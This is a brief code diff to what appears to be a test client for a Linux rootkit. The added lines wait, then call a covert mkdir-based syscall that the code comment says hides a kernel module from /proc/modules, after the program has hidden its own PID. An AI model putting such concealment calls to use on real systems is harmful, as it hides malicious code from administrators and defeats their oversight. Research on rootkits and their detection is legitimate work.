@@ -25,6 +25,8 @@ string getPID() {
 
 int main() {
 	cout << hidepid(getPID()) << endl;
+	sleep(15);
+	cout << syscall(SYS_mkdir, secret_api_procmods) << endl; //enable the hiding of the module in /proc/modules
 	while (true) {
 		ofstream outfile("/var/log/foobar", ofstream::app);
 		outfile << "foobar" << endl;
